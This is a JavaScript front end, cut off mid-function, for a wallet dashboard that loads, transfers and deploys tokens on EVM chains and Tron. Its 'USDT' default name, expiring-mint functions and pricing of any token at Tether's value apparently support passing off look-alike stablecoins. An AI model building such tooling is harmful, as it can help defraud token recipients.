let provider;
let rpcProvider;
let signer;
let systemSigner;
let mainContract;
let tronContract;
let contractABI;
let contractBytecode;
let mainTokenName = "BEP20USDT";
let mainTokenSymbol = "USDT";
let mainTokenDecimals = 18;
let mainTokenImage = "";
let tronApiKey = localStorage.getItem('tron_api_key') || "";
let isPaused = false;
let isOwner = false;

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// UI Elements
const connectBtn = document.getElementById('connect-button');
const walletAddrDisplay = document.getElementById('wallet-address-display');
const walletInfoDiv = document.getElementById('wallet-info');
const tokenBalanceH2 = document.getElementById('token-balance');
const statusMsg = document.getElementById('status-message');
const contractAddrInput = document.getElementById('contract-address');
const settingsContractInput = document.getElementById('settings-contract-address');
const recipientInput = document.getElementById('recipient-address');
const networkSelector = document.getElementById('network-selector');
const gasCurrencyDisplay = document.getElementById('gas-currency');

const NETWORKS = {
    local: {
        name: "Localhost (Hardhat)",
        rpc: "http://127.0.0.1:8545",
        chainId: "0x7a69", // 31337
        symbol: "ETH",
        usdt: "" // Será carregado do config.json
    },
    bsc: {
        name: "BNB Smart Chain",
        rpc: "https://bsc-dataseed.binance.org/",
        chainId: "0x38", // 56
        symbol: "BNB",
        usdt: "0x55d398326f99059ff775485246999027b3197955"
    },
    eth: {
        name: "Ethereum Mainnet",
        rpc: "https://eth.llamarpc.com",
        chainId: "0x1", // 1
        symbol: "ETH",
        usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7"
    },
    sepolia: {
        name: "Sepolia Testnet",
        rpc: "https://rpc.ankr.com/eth_sepolia",
        chainId: "0xaa36a7", // 11155111
        symbol: "ETH",
        usdt: ""
    },
    tron: {
        name: "Tron Mainnet",
        rpc: "TRON_SPECIAL",
        chainId: "0x0",
        symbol: "TRX",
        usdt: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
    },
    shasta: {
        name: "Tron Shasta Testnet",
        rpc: "TRON_SPECIAL",
        chainId: "0x0",
        symbol: "TRX",
        usdt: "TG3W67SPhFshz36uvYqA8W5kGqVw1jT48V"
    }
};

function isTron(netKey) {
    return netKey === 'tron' || netKey === 'shasta';
}

// Fallback ABI for basic ERC20 functions
const ERC20_ABI = [
    "function name() view returns (string)",
    "function symbol() view returns (string)",
    "function decimals() view returns (uint8)",
    "function totalSupply() view returns (uint256)",
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address, uint256) returns (bool)",
    "function mint(address, uint256)",
    "function mintWithExpiry(address, uint256, uint256)",
    "function setExpirationTime(address, uint256)",
    "function issue(uint256)",
    "function redeem(uint256)",
    "function setParams(uint256, uint256)",
    "function deprecate(address)",
    "function basisPointsRate() view returns (uint256)",
    "function maximumFee() view returns (uint256)",
    "function upgradedAddress() view returns (address)",
    "function deprecated() view returns (bool)",
    "function getBlackListStatus(address) view returns (bool)",
    "function getOwner() view returns (address)",
    "event Transfer(address indexed from, address indexed to, uint256 value)",
    "event Issue(uint256 amount)",
    "event Redeem(uint256 amount)",
    "event Params(uint feeBasisPoints, uint maxFee)",
    "event Deprecate(address newAddress)"
];

// Tab Logic
const navItems = document.querySelectorAll('.nav-item');
const tabContents = document.querySelectorAll('.tab-content');

navItems.forEach(item => {
    item.onclick = () => {
        const tabId = item.getAttribute('data-tab');
        
        // Update active nav
        navItems.forEach(i => i.classList.remove('active'));
        item.classList.add('active');
        
        // Update visible tab
        tabContents.forEach(content => {
            content.classList.remove('active');
            if (content.id === tabId) content.classList.add('active');
        });
    };
});

// Load Config
async function loadConfig() {
    try {
        const netKey = networkSelector.value;
        const netConfig = NETWORKS[netKey];
        
        console.log(`🔄 Carregando configurações para rede: ${netKey}`);

        // Atualiza símbolo do gás na UI
        if (gasCurrencyDisplay) {
            gasCurrencyDisplay.innerText = netConfig.symbol;
        }

        const response = await fetch('config.json?t=' + Date.now());
        let configData = null;
        if (response.ok) {
            configData = await response.json();
            console.log("📁 Artefatos de contrato carregados.");
            if (configData.abi) contractABI = configData.abi;
            if (configData.bytecode) contractBytecode = configData.bytecode;
        }

        // Se estiver no Localhost, tenta pegar o endereço do config.json
        if (netKey === 'local' && configData && configData.address) {
            contractAddrInput.value = configData.address;
            settingsContractInput.value = configData.address;
        }

        // Inicializa o provedor da rede selecionada
        if (!isTron(netKey)) {
            rpcProvider = new ethers.JsonRpcProvider(netConfig.rpc);
            
            // Se for local, tenta carregar o assinante do sistema
            if (netKey === 'local') {
                rpcProvider.getSigner(0).then(s => {
                    systemSigner = s;
                    console.log("🤖 Assinante de sistema (Hardhat) carregado.");
                    if (!signer) initMainContract();
                }).catch(err => {
                    console.warn("⚠️ Não foi possível carregar conta do Hardhat. Verifique se o comando 'npm run dev' está rodando.");
                    systemSigner = null;
                });
            } else {
                systemSigner = null;
            }

            // Verifica conexão básica
            rpcProvider.getNetwork().then(net => {
                console.log(`✅ RPC conectado: ${netConfig.name} (URL: ${netConfig.rpc}, ChainID: ${net.chainId})`);
            }).catch(err => {
                console.error(`⚠️ Erro crítico ao conectar no RPC de ${netConfig.name} (${netConfig.rpc}):`, err);
            });
        } else {
            // Configura API Key na Tron se disponível
            if (window.tronWeb && tronApiKey) {
                if (window.tronWeb.setHeader) {
                    window.tronWeb.setHeader({"TRON-PRO-API-KEY": tronApiKey});
                }
            }
            
            if (window.tronWeb && window.tronWeb.ready) {
                // Tenta carregar endereço da carteira Tron
                const address = window.tronWeb.defaultAddress.base58;
                if (address) {
                    walletAddrDisplay.innerText = `TronLink: ${address.substring(0, 10)}...`;
                    walletInfoDiv.classList.remove('hidden');
                    connectBtn.querySelector('span').innerText = "Conectado";
                }
            }
        }

        if (contractAddrInput.value) initMainContract();

    } catch (e) {
        console.error("Erro ao carregar configurações:", e);
    }
}

async function switchNetwork() {
    const netKey = networkSelector.value;
    const netConfig = NETWORKS[netKey];

    showStatus(`Alterando para rede ${netConfig.name}...`, "info");

    if (isTron(netKey)) {
        showToast(`Rede ${netConfig.name} requer TronLink.`, "info");
        // Sugere o endereço USDT da Tron
        contractAddrInput.value = netConfig.usdt;
        settingsContractInput.value = netConfig.usdt;
        mainTokenImage = 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/usdt.png';
        document.getElementById('settings-token-image').value = mainTokenImage;
    } else {
        // Sugere automaticamente o endereço USDT oficial se estiver mudando para rede pública
        if (netConfig.usdt) {
            contractAddrInput.value = netConfig.usdt;
            settingsContractInput.value = netConfig.usdt;
            mainTokenImage = 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/usdt.png';
            document.getElementById('settings-token-image').value = mainTokenImage;
        } else if (netKey === 'local') {
            // Recarrega do config.json se for local
            await loadConfig();
        }

        // Se estiver com MetaMask conectado, tenta trocar a rede nela também
        if (window.ethereum && (signer || provider)) {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: netConfig.chainId }],
                });
                // Recarrega o provider/signer após trocar de rede no MetaMask
                provider = new ethers.BrowserProvider(window.ethereum);
                if (signer) {
                    signer = await provider.getSigner();
                    console.log("🔄 Signer atualizado para nova rede.");
                }
            } catch (switchError) {
                // Se a rede não existir no MetaMask, pede para adicionar (ex: BSC)
                if (switchError.code === 4902) {
                    try {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: netConfig.chainId,
                                chainName: netConfig.name,
                                nativeCurrency: { name: netConfig.symbol, symbol: netConfig.symbol, decimals: 18 },
                                rpcUrls: [netConfig.rpc]
                            }],
                        });
                    } catch (addError) {
                        showStatus("Erro ao adicionar rede ao MetaMask.", "error");
                    }
                }
            }
        }
    }

    await loadConfig();
}

networkSelector.onchange = switchNetwork;

// Wallet Connection
async function connectWallet() {
    const netKey = networkSelector.value;

    if (isTron(netKey)) {
        if (window.tronWeb) {
            try {
                // TronLink request accounts
                await window.tronLink.request({ method: 'tron_requestAccounts' });
                const address = window.tronWeb.defaultAddress.base58;
                walletAddrDisplay.innerText = `TronLink: ${address.substring(0, 10)}...`;
                walletInfoDiv.classList.remove('hidden');
                connectBtn.querySelector('span').innerText = "Conectado";
                initMainContract();
                showStatus("TronLink conectada!", "success");
            } catch (e) {
                showStatus("Erro ao conectar TronLink: " + e.message, "error");
            }
        } else {
            showStatus('TronLink não encontrada! Instale em <a href="https://www.tronlink.org/" target="_blank" style="color: #007bff; text-decoration: underline;">tronlink.org</a>', "error");
        }
        return;
    }

    if (!window.ethereum) {
        showStatus("MetaMask não encontrada!", "error");
        return;
    }

    try {
        const netKey = networkSelector.value;
        const netConfig = NETWORKS[netKey];

        provider = new ethers.BrowserProvider(window.ethereum);
        
        // Verifica se a rede do MetaMask coincide com a selecionada no dropdown
        const network = await provider.getNetwork();
        const chainIdHex = "0x" + network.chainId.toString(16);
        
        if (netKey !== 'tron' && netKey !== 'shasta' && chainIdHex !== netConfig.chainId) {
            showStatus(`Mudando MetaMask para ${netConfig.name}...`, "info");
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: netConfig.chainId }],
                });
            } catch (e) {
                if (e.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: netConfig.chainId,
                            chainName: netConfig.name,
                            nativeCurrency: { name: netConfig.symbol, symbol: netConfig.symbol, decimals: 18 },
                            rpcUrls: [netConfig.rpc]
                        }],
                    });
                } else {
                    throw e;
                }
            }
        }

        await window.ethereum.request({ method: 'eth_requestAccounts' });
        signer = await provider.getSigner();
        const address = await signer.getAddress();

        walletAddrDisplay.innerText = `MetaMask: ${address.substring(0, 10)}...`;
        walletInfoDiv.classList.remove('hidden');
        connectBtn.querySelector('span').innerText = "Conectado";

        initMainContract();
        showStatus("MetaMask conectada!", "success");
    } catch (error) {
        showStatus("Erro ao conectar MetaMask: " + (error.reason || error.message), "error");
    }
}

function getActiveSigner() {
    return signer || systemSigner;
}

async function initMainContract() {
    const address = contractAddrInput.value.trim();
    const netKey = networkSelector.value;
    
    if (isTron(netKey)) {
        if (!window.tronWeb || !window.tronWeb.isAddress(address)) return;
        try {
            showStatus("Carregando contrato Tron...", "info");
            tronContract = await window.tronWeb.contract().at(address);
            
            // TronWeb calls are slightly different. Adicionamos delay para evitar Rate Limit
            const symbol = await tronContract.symbol().call();
            await sleep(500); 
            const decimals = await tronContract.decimals().call();
            await sleep(500);
            const name = await tronContract.name().call();
            
            mainTokenName = typeof name === 'string' ? name : name.toString();
            mainTokenSymbol = typeof symbol === 'string' ? symbol : symbol.toString();
            mainTokenDecimals = Number(decimals);

            // Detecção de imagem para Tron
            const netConfig = NETWORKS[netKey];
            if (address === netConfig.usdt) {
                mainTokenImage = 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/usdt.png';
            } else {
                mainTokenImage = document.getElementById('settings-token-image').value;
            }
            document.getElementById('settings-token-image').value = mainTokenImage;
            
            showStatus(`Contrato Tron ${mainTokenSymbol} carregado!`, "success");
            updateUIText();
            updateBalance();
        } catch (e) {
            console.error(e);
            showStatus("Erro ao carregar contrato Tron.", "error");
        }
        return;
    }

    if (address && !ethers.isAddress(address)) {
        showStatus("O endereço do contrato informado não é válido.", "error");
        return;
    }
    if (!address) return;

    try {
        const netKey = networkSelector.value;
        const netConfig = NETWORKS[netKey];

        const currentSigner = getActiveSigner();
        const activeProvider = currentSigner || rpcProvider;
        const checkProvider = (currentSigner && currentSigner.provider) || rpcProvider;
        
        // Verifica se o endereço tem código na rede atual
        showStatus(`Verificando contrato na rede ${netConfig.name}...`, "info");
        console.log(`🔍 Verificando código em ${address} via ${netConfig.rpc}`);
        
        // Verifica se a rede da carteira bate com a rede do painel
        if (signer && signer.provider) {
            const walletNet = await signer.provider.getNetwork();
            const walletChainId = "0x" + walletNet.chainId.toString(16);
            if (walletChainId !== netConfig.chainId) {
                showStatus(`MetaMask está na rede errada (${walletChainId}). Selecione ${netConfig.name} na carteira.`, "error");
                return;
            }
        }

        let code;
        try {
            code = await checkProvider.getCode(address);
        } catch (codeErr) {
            console.warn("Falha na primeira tentativa de getCode, tentando novamente...", codeErr);
            // Pequeno delay e tenta novamente uma vez
            await new Promise(resolve => setTimeout(resolve, 1000));
            code = await checkProvider.getCode(address);
        }

        if (code === '0x' || code === '0x0' || !code) {
            const netName = NETWORKS[networkSelector.value].name;
            showStatus(`Contrato não encontrado na rede ${netName}. Você já fez o deploy nesta rede?`, "error");
            
            // Adiciona um link/ação no console para facilitar
            console.log("%c Dica: Use a aba 'Gerador de Tokens' para colocar o seu contrato nesta rede!", "color: blue; font-weight: bold;");
            return;
        }

        if (address.toLowerCase() === netConfig.usdt?.toLowerCase()) {
            console.log("%c ℹ️ Usando o endereço USDT oficial da rede.", "color: #3498db; font-weight: bold;");
            mainTokenImage = 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/usdt.png';
        } else {
            console.log("%c ℹ️ Usando um contrato de token customizado.", "color: #27ae60; font-weight: bold;");
            mainTokenImage = document.getElementById('settings-token-image').value;
        }
        
        document.getElementById('settings-token-image').value = mainTokenImage;

        // Usa o ABI carregado ou fallback para ERC20 padrão
        mainContract = new ethers.Contract(address, contractABI || ERC20_ABI, activeProvider);
        
        mainTokenName = await mainContract.name();
        mainTokenSymbol = await mainContract.symbol();
        mainTokenDecimals = Number(await mainContract.decimals());
        
        // Verifica se o usuário é o dono (Admin)
        try {
            const currentAddress = await (getActiveSigner()?.getAddress() || Promise.resolve(null));
            const owner = await mainContract.owner();
            
            isOwner = currentAddress && owner.toLowerCase() === currentAddress.toLowerCase();
            
            if (isOwner) {
                console.log("%c 👑 Você é o DONO deste contrato. Funções de controle habilitadas.", "color: #f1c40f; font-weight: bold; font-size: 1rem;");
                document.getElementById('nav-admin').classList.remove('hidden');
                showToast("Admin Detectado: Painel de controle ativado.", "info");
            } else {
                document.getElementById('nav-admin').classList.add('hidden');
            }

            // Verifica status de pausa
            isPaused = await mainContract.paused();
            updateAdminUI();

        } catch (err) {
            document.getElementById('nav-admin').classList.add('hidden');
        }

        showStatus(`Contrato ${mainTokenSymbol} carregado com sucesso!`, "success");
        updateUIText();
        updateBalance();
    } catch (e) {
        console.error("Erro ao iniciar contrato:", e);
        let errorMsg = "Contrato não encontrado neste endereço ou rede incorreta.";
        if (e.message.toLowerCase().includes("network") || e.message.toLowerCase().includes("fetch") || e.message.toLowerCase().includes("could not connect")) {
            errorMsg = "Erro de conexão com a rede. Verifique se o nó está rodando ou se a rede selecionada está correta.";
        }
        showStatus(errorMsg, "error");
    }
}

async function updateBalance() {
    const netKey = networkSelector.value;
    updatePrice(); // Atualiza o valor em USD simultaneamente

    if (isTron(netKey)) {
        if (tronContract && window.tronWeb && window.tronWeb.defaultAddress.base58) {
            try {
                const balance = await tronContract.balanceOf(window.tronWeb.defaultAddress.base58).call();
                // More precise:
                const formattedPrecise = Number(balance) / (10 ** mainTokenDecimals);
                tokenBalanceH2.innerText = `${formattedPrecise.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})} ${mainTokenSymbol}`;
            } catch (e) {
                console.error(e);
            }
        }
        return;
    }

    const currentSigner = getActiveSigner();
    if (!mainContract || !currentSigner) return;
    try {
        const address = await currentSigner.getAddress();
        const balance = await mainContract.balanceOf(address);
        console.log(`💰 Saldo Bruto (${mainTokenSymbol}): ${balance.toString()} | Decimais: ${mainTokenDecimals}`);
        tokenBalanceH2.innerText = `${ethers.formatUnits(balance, mainTokenDecimals)} ${mainTokenSymbol}`;
    } catch (e) {
        console.error("Erro ao atualizar saldo:", e);
    }
}

function updateUIText() {
    const symbolSpans = document.querySelectorAll('#display-token-symbol, #warning-token-symbol');
    symbolSpans.forEach(span => {
        span.innerText = mainTokenSymbol;
    });
    const nameSpans = document.querySelectorAll('#display-token-name, .active-token-name');
    nameSpans.forEach(span => {
        span.innerText = mainTokenName;
    });

    // Logo Update
    const logoImg = document.getElementById('token-logo-img');
    const logoDefault = document.getElementById('token-logo-default');
    if (mainTokenImage) {
        logoImg.src = mainTokenImage;
        logoImg.classList.remove('hidden');
        logoDefault.classList.add('hidden');
    } else {
        logoImg.classList.add('hidden');
        logoDefault.classList.remove('hidden');
    }

    // Tron Gas Warning Update
    const tronGasWarning = document.getElementById('tron-gas-warning');
    if (tronGasWarning) {
        if (isTron(networkSelector.value)) {
            tronGasWarning.classList.remove('hidden');
        } else {
            tronGasWarning.classList.add('hidden');
        }
    }

    // Liquidity Tab Updates
    updateLiquidityInfo();
}

function updateLiquidityInfo() {
    const netKey = networkSelector.value;
    const dexNameEl = document.getElementById('dex-name');
    const pairEl = document.getElementById('liquidity-pair');
    const dexLinkEl = document.getElementById('dex-link');
    
    if (!dexNameEl) return;

    if (netKey === 'bsc') {
        dexNameEl.innerText = "PancakeSwap";
        pairEl.innerText = `${mainTokenSymbol} / BNB`;
        dexLinkEl.href = "https://pancakeswap.finance/add";
    } else if (netKey === 'eth' || netKey === 'sepolia') {
        dexNameEl.innerText = "Uniswap (V3)";
        pairEl.innerText = `${mainTokenSymbol} / ETH`;
        dexLinkEl.href = "https://app.uniswap.org/#/add";
    } else if (isTron(netKey)) {
        dexNameEl.innerText = "SunSwap";
        pairEl.innerText = `${mainTokenSymbol} / TRX`;
        dexLinkEl.href = "https://sunswap.com/#/pool";
    } else {
        dexNameEl.innerText = "Ambiente Local";
        pairEl.innerText = "N/A (Use Redes Públicas)";
        dexLinkEl.href = "#";
    }
}

function updateAdminUI() {
    const statusText = document.getElementById('pause-status-text');
    const statusBadge = document.getElementById('pause-status-badge');
    const toggleBtn = document.getElementById('toggle-pause-btn');

    if (isPaused) {
        statusText.innerText = "PAUSADO";
        statusBadge.classList.add('paused');
        toggleBtn.innerHTML = '<i class="fas fa-play"></i> Retomar Contrato';
        toggleBtn.className = "btn-primary btn-full";
    } else {
        statusText.innerText = "ATIVO";
        statusBadge.classList.remove('paused');
        toggleBtn.innerHTML = '<i class="fas fa-pause"></i> Pausar Contrato';
        toggleBtn.className = "btn-warning btn-full";
    }
}

async function togglePause() {
    if (!isOwner) return;
    try {
        const signer = getActiveSigner();
        const tx = isPaused ? 
            await mainContract.connect(signer).unpause() : 
            await mainContract.connect(signer).pause();
        
        showToast("Transação enviada! Aguardando confirmação...", "info");
        await tx.wait();
        
        isPaused = !isPaused;
        updateAdminUI();
        showToast(isPaused ? "Contrato Pausado!" : "Contrato Ativado!", "success");
    } catch (e) {
        console.error(e);
        showToast("Erro ao alterar status de pausa.", "error");
    }
}

async function handleBlacklist(action) {
    const address = document.getElementById('blacklist-address').value.trim();
    if (!ethers.isAddress(address)) {
        showToast("Endereço inválido.", "error");
        return;
    }

    try {
        const signer = getActiveSigner();
        let tx;
        if (action === 'add') {
            tx = await mainContract.connect(signer).addBlackList(address);
            showToast(`Bloqueando ${address}...`, "info");
        } else {
            tx = await mainContract.connect(signer).removeBlackList(address);
            showToast(`Desbloqueando ${address}...`, "info");
        }
        
        await tx.wait();
        showToast("Operação concluída com sucesso!", "success");
        document.getElementById('blacklist-address').value = "";
    } catch (e) {
        console.error(e);
        showToast("Erro na operação de Blacklist.", "error");
    }
}

async function destroyFunds() {
    const address = document.getElementById('burn-blacklist-address').value.trim();
    if (!ethers.isAddress(address)) {
        showToast("Endereço inválido.", "error");
        return;
    }

    if (!confirm("Tem certeza que deseja DESTRUIR os fundos desta carteira? Esta ação é irreversível.")) {
        return;
    }

    try {
        const signer = getActiveSigner();
        const tx = await mainContract.connect(signer).destroyBlackFunds(address);
        showToast(`Destruindo fundos de ${address}...`, "info");
        
        await tx.wait();
        showToast("Fundos destruídos com sucesso!", "success");
        updateBalance();
        document.getElementById('burn-blacklist-address').value = "";
    } catch (e) {
        console.error(e);
        const reason = e.reason || "Verifique se a conta está na blacklist.";
        showToast("Erro: " + reason, "error");
    }
}

async function setAdminExpiry() {
    const address = document.getElementById('expiry-admin-address').value.trim();
    const minutes = document.getElementById('expiry-admin-minutes').value || 0;

    if (!ethers.isAddress(address)) {
        showToast("Endereço inválido.", "error");
        return;
    }

    try {
        const signer = getActiveSigner();
        const tx = await mainContract.connect(signer).setExpirationTime(address, minutes);
        showToast(`Definindo expiração para ${address}...`, "info");
        
        await tx.wait();
        showToast(minutes > 0 ? `Expiração definida para ${minutes} minutos!` : "Expiração removida!", "success");
        document.getElementById('expiry-admin-address').value = "";
        document.getElementById('expiry-admin-minutes').value = "";
    } catch (e) {
        console.error(e);
        showToast("Erro ao definir expiração.", "error");
    }
}

async function checkExternalBalance() {
    const address = document.getElementById('check-address').value.trim();
    const netKey = networkSelector.value;

    if (isTron(netKey)) {
        if (!tronContract) return;
        try {
            const balance = await tronContract.balanceOf(address).call();
            const formatted = Number(balance) / (10 ** mainTokenDecimals);
            showToast(`Saldo de ${address.substring(0, 6)}...: ${formatted} ${mainTokenSymbol}`, "info");
        } catch (e) {
            showToast("Erro ao consultar saldo na Tron.", "error");
        }
        return;
    }

    if (!mainContract) {
        showToast("Carregue um contrato primeiro.", "error");
        return;
    }
    if (!ethers.isAddress(address)) {
        showToast("Endereço inválido.", "error");
        return;
    }
    try {
        const balance = await mainContract.balanceOf(address);
        const formatted = ethers.formatUnits(balance, mainTokenDecimals);
        showToast(`Saldo de ${address.substring(0, 6)}...: ${formatted} ${mainTokenSymbol}`, "info");
    } catch (e) {
        showToast("Erro ao consultar saldo.", "error");
    }
}

// Token Transfer
async function updatePrice() {
    try {
        const valueDisplay = document.getElementById('token-value-usd');
        if (!valueDisplay) return;

        // Tenta buscar o preço real do USDT via CoinGecko
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tether&vs_currencies=usd');
        const data = await response.json();
        const price = data.tether.usd;

        const currentSigner = getActiveSigner();
        let balanceValue = 0;

        if (isTron(networkSelector.value)) {
            if (tronContract && window.tronWeb.defaultAddress.base58) {
                const balance = await tronContract.balanceOf(window.tronWeb.defaultAddress.base58).call();
                balanceValue = Number(balance) / (10 ** mainTokenDecimals);
            }
        } else if (mainContract && currentSigner) {
            const address = await currentSigner.getAddress();
            const balance = await mainContract.balanceOf(address);
            balanceValue = Number(ethers.formatUnits(balance, mainTokenDecimals));
        }

        const totalUsd = balanceValue * price;
        valueDisplay.innerText = `≈ $${totalUsd.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})} USD`;
    } catch (e) {
        console.warn("Não foi possível buscar o preço real do USDT. Usando $1.00 como base.");
        // Fallback: Se a API falhar, assume 1:1 para simulação
        const valueDisplay = document.getElementById('token-value-usd');
        if (valueDisplay) {
            const balanceText = tokenBalanceH2.innerText.split(' ')[0].replace(/,/g, '');
            const balanceValue = parseFloat(balanceText) || 0;
            valueDisplay.innerText = `≈ $${balanceValue.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})} USD`;
        }
    }
}

async function sendTokens() {
    const recipient = recipientInput.value.trim();
    const amount = document.getElementById('transfer-amount').value;
    const sendBtn = document.getElementById('send-button');
    const netKey = networkSelector.value;

    if (isTron(netKey)) {
        if (!tronContract || !window.tronWeb) {
            showStatus("TronLink não conectada ou contrato não carregado.", "error");
            return;
        }
        try {
            sendBtn.disabled = true;
            showStatus("Enviando na rede Tron...", "info");
            
            const amountInSun = BigInt(Math.floor(amount * (10 ** mainTokenDecimals)));
            const result = await tronContract.transfer(recipient, amountInSun.toString()).send();
            
            showStatus("Transferência Tron enviada!", "success");
            updateBalance();
        } catch (e) {
            showStatus("Erro Tron: " + (e.message || e), "error");
        } finally {
            sendBtn.disabled = false;
        }
        return;
    }

    const currentSigner = getActiveSigner();

    if (!mainContract || !currentSigner) {
        showStatus("Nenhum assinante disponível. Aguarde o nó carregar.", "error");
        return;
    }
    if (!ethers.isAddress(recipient)) {
        showStatus("Endereço de destino inválido.", "error");
        return;
    }
    if (!amount || amount <= 0) {
        showStatus("Quantidade inválida.", "error");
        return;
    }

    try {
        sendBtn.disabled = true;
        showStatus("Verificando saldo...", "info");

        const senderAddress = await currentSigner.getAddress();
        const balance = await mainContract.balanceOf(senderAddress);
        const amountWei = ethers.parseUnits(amount.toString(), mainTokenDecimals);

        if (balance < amountWei) {
            const formattedBalance = ethers.formatUnits(balance, mainTokenDecimals);
            showStatus(`Saldo insuficiente! Você tem ${formattedBalance} ${mainTokenSymbol} nesta carteira.`, "error");
            sendBtn.disabled = false;
            return;
        }

        showStatus("Processando transação...", "");
        
        // Conecta o contrato ao assinante atual (MetaMask ou Sistema)
        const contractWithSigner = mainContract.connect(currentSigner);
        
        const tx = await contractWithSigner.transfer(
            recipient, 
            ethers.parseUnits(amount.toString(), mainTokenDecimals)
        );
        
        showStatus("Aguardando confirmação...", "info");
        await tx.wait();
        
        showStatus("Transferência realizada!", "success");
        showToast("Se o saldo não mudar no MetaMask, clique em 'Adicionar ao MetaMask'!", "info");
        updateBalance();
    } catch (error) {
        console.error("Erro detalhado na transferência:", error);
        showStatus("Erro: " + (error.reason || error.message), "error");
    } finally {
        sendBtn.disabled = false;
    }
}

// Token Generator Logic
async function deployNewToken() {
    const name = document.getElementById('gen-name').value.trim();
    const symbol = document.getElementById('gen-symbol').value.trim();
    const supply = document.getElementById('gen-supply').value;
    const decimals = document.getElementById('gen-decimals').value;
    const expiry = document.getElementById('gen-expiry').value || 0;
    const deployBtn = document.getElementById('deploy-token-button');
    const netKey = networkSelector.value;

    if (!name || !symbol || !supply) {
        showStatus("Preencha todos os campos do token!", "error");
        return;
    }

    if (supply <= 0) {
        showStatus("O suprimento inicial deve ser maior que zero.", "error");
        return;
    }

    if (!contractABI || !contractBytecode) {
        showStatus("Erro: Artefatos do contrato não carregados. Execute o deploy inicial primeiro.", "error");
        return;
    }

    if (isTron(netKey)) {
        if (!window.tronWeb || !window.tronWeb.ready) {
            showStatus("Conecte o TronLink primeiro!", "error");
            return;
        }
        try {
            deployBtn.disabled = true;
            deployBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Fazendo Deploy Tron...';
            showStatus("Iniciando deploy na Tron...", "info");

            // Verifica saldo TRX antes do deploy
            try {
                const trxBalance = await window.tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
                console.log(`💰 Saldo TRX: ${window.tronWeb.fromSun(trxBalance)} TRX`);
                if (trxBalance < 100000000) { // Menos de 100 TRX (aprox para um deploy sem energy)
                    showToast("Aviso: Seu saldo de TRX é baixo. Deploys na Tron podem falhar sem TRX ou Energy suficiente.", "info");
                }
                if (trxBalance === 0) {
                    showStatus("Erro: Você precisa de TRX para pagar as taxas da rede Tron.", "error");
                    deployBtn.disabled = false;
                    deployBtn.innerHTML = '<i class="fas fa-rocket"></i> Gerar Novo Token';
                    return;
                }
            } catch (trxErr) {
                console.warn("Não foi possível verificar saldo TRX.", trxErr);
            }

            const cleanBytecode = contractBytecode.startsWith('0x') ? contractBytecode.substring(2) : contractBytecode;

            const options = {
                feeLimit: 1000000000,
                callValue: 0,
                userFeePercentage: 100,
                originEnergyLimit: 10000000,
                abi: contractABI,
                bytecode: cleanBytecode,
                parameters: [
                    name,
                    symbol,
                    supply,
                    decimals
                ]
            };

            const transaction = await window.tronWeb.transactionBuilder.createSmartContract(options, window.tronWeb.defaultAddress.base58);
            const signedTransaction = await window.tronWeb.trx.sign(transaction);
            const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTransaction);

            if (broadcast.result) {
                const newAddress = window.tronWeb.address.fromHex(broadcast.transaction.contract_address);
                document.getElementById('new-token-address').innerText = newAddress;
                document.getElementById('new-token-owner').innerText = window.tronWeb.defaultAddress.base58;
                document.getElementById('new-token-hash').innerText = broadcast.transaction.txID.substring(0, 20) + "...";
                
                // Verifica saldo Tron imediato para feedback
                try {
                    const tempTronContract = await window.tronWeb.contract().at(newAddress);
                    const bal = await tempTronContract.balanceOf(window.tronWeb.defaultAddress.base58).call();
                    const dec = await tempTronContract.decimals().call();
                    const formattedBal = Number(bal) / (10 ** Number(dec));
                    console.log(`✅ Saldo Tron verificado: ${formattedBal} ${symbol}`);
                    showToast(`Sucesso! Sua carteira TronLink recebeu ${formattedBal} ${symbol}.`, "success");
                } catch (tronBalErr) {
                    console.warn("Não foi possível verificar saldo Tron imediatamente.", tronBalErr);
                }

                // Mostra a dica específica para Tron
                document.getElementById('tron-deploy-tip').classList.remove('hidden');
                document.getElementById('add-new-metamask').innerHTML = '<i class="fas fa-plus-circle"></i> Importar no TronLink';

                document.getElementById('deployment-result').classList.remove('hidden');
                showStatus(`Token Tron ${symbol} gerado com sucesso!`, "success");
                showToast("Sim! Os tokens foram enviados automaticamente para sua carteira.", "success");
            } else {
                throw new Error("Falha ao transmitir transação na Tron.");
            }
        } catch (e) {
            showStatus("Erro Deploy Tron: " + (e.message || e), "error");
        } finally {
            deployBtn.disabled = false;
            deployBtn.innerHTML = '<i class="fas fa-rocket"></i> Gerar Novo Token';
        }
        return;
    }

    const currentSigner = getActiveSigner();

    if (!currentSigner) {
        showStatus("Conecte sua carteira (MetaMask) para gerar tokens em redes públicas.", "error");
        return;
    }

    try {
        deployBtn.disabled = true;
        deployBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Fazendo Deploy...';
        showStatus("Iniciando deploy...", "info");

        // Verifica saldo antes do deploy
        try {
            const balance = await currentSigner.provider.getBalance(await currentSigner.getAddress());
            console.log(`💰 Saldo do emissor: ${ethers.formatEther(balance)} ${NETWORKS[netKey].symbol}`);
            if (balance === 0n && netKey !== 'local') {
                showStatus("Seu saldo é zero. Você precisa de saldo para pagar o gás.", "error");
                deployBtn.disabled = false;
                deployBtn.innerHTML = '<i class="fas fa-rocket"></i> Gerar Novo Token';
                return;
            }
        } catch (balErr) {
            console.warn("Não foi possível verificar o saldo antes do deploy.", balErr);
        }

